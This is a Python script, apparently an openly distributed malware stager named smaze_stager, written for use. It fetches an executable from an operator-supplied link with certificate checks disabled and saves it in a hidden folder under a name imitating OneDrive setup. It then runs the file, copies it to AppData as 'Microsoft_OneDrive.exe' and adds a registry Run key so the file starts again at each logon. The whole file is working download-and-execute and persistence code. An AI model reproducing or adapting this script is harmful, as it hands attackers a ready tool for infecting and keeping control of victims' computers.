# custom download and execute payload
# official github page > https://github.com/falkensmz/smazestager

import os
from subprocess import call
import requests
from time import sleep
import urllib3
import shutil
import sys

link = ""            # input the link to the malware download page here (make sure that the url ends in something like ".exe")
sleep_before = 0     # input the amount of time smaze_stager will sleep until it downloads the malware (in seconds) ;  leave default of '0' for nothing
sleep_after = 0       # input the amount of time smaze_stager will sleep after it downloads the malware,until it executes it (in seconds) ; leave default of '0' for nothing
urllib3.disable_warnings()

def getUsername():
    try:
        username = os.getlogin()
    except Exception as e:
        username = "None"
    return username

username = getUsername()

def createMalwareDropLocation():
    try:
        directory = ".OneDrive"
        parent_directory = fr"C:\Users\{username}"
        path = os.path.join(parent_directory, directory)
        os.mkdir(path)
    except Exception as e:
        exit()

def download():
    try:
        path = fr'C:\Users\{username}\.OneDrive'
        r = requests.get(link, allow_redirects=True, verify=False)
        open(fr"{path}\OneDrive_setup.exe", 'wb').write(r.content)
    except Exception as e:
        exit()
    
    
def runMalware():
    try:
        path = fr'C:\Users\{username}\.OneDrive'
        sleep(sleep_after)
        os.chdir(path)
        os.system("OneDrive_setup.exe")
        sleep(25)       # you can modify this to whatever you want
    except Exception as e:
        exit()

def establishPersistence(): # this function will make your malware persistent. note that if your malware is programmed to do the same thing, I suggest commenting this function out 
    try:
        persistent_malware_location = os.environ["appdata"] + "\\Microsoft_OneDrive.exe"
        if not os.path.exists(persistent_malware_location):
            shutil.copyfile(fr'C:\Users\{username}\.OneDrive\OneDrive_setup.exe', persistent_malware_location)
            call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Microsoft_OneDrive /t REG_SZ /d "' + persistent_malware_location + '"', shell=True)
        else:
            # persistence for the executable has already been established, thus the program will exit
            exit()
    except Exception as e:
        exit()
        
        

def afterMath():
    getUsername()
    sleep(sleep_before)
    createMalwareDropLocation()
    download()
    runMalware()
    establishPersistence()

afterMath()


# thank you for using smaze_stager
# ~ falkensmz
